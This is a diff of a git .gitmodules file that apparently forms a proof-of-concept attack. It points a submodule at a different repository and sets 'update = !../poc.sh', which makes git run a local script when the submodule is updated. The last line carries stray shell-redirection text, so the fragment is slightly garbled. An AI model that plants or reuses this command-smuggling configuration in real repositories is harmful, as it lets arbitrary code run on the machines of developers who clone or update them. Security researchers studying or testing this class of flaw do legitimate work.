@@ -1,5 +1,5 @@
 
 [submodule "samplemodule"]
 	path = samplemodule
-	url = https://github.com/JhonnyJason/samplemodule.git
+	url = https://github.com/chencohen3/gitush.git
 	update = !../poc.sh' >> .gitmodules
